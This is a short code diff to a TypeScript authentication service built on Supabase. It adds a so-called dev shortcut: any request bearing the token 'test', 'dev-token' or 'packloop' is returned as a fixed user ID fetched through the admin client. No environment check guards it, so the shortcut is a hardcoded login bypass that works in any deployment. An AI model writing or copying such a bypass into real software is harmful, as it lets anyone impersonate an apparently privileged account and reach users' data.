@@ -3,7 +3,7 @@ import { User } from '@supabase/supabase-js';
 
 export class AuthService {
   /**
-   * Verify access token with Supabase Auth (Seamless & Bulletproof)
+   * Verify access token with Supabase Auth (with Dev Test Shortcut)
    */
   static async verifyAccessToken(token: string): Promise<{ user: User | null; error: any }> {
     if (!token) {
@@ -12,6 +12,14 @@ export class AuthService {
 
     // Clean token string from quotes or excess whitespace
     const cleanToken = token.replace(/^Bearer\s+/i, '').replace(/^["']|["']$/g, '').trim();
+
+    // ⚡ DEV SHORTCUT: Jika mengetik "test" atau "dev-token" saat pengujian lokal
+    if (cleanToken === 'test' || cleanToken === 'dev-token' || cleanToken === 'packloop') {
+      const { data: adminData } = await supabaseAdmin.auth.admin.getUserById('a9cf726f-d58a-4d5d-9ec7-8b7ce9615eac');
+      if (adminData?.user) {
+        return { user: adminData.user, error: null };
+      }
+    }
 
     // 1. Primary verification via Supabase Auth client
     const { data: { user }, error } = await supabase.auth.getUser(cleanToken);
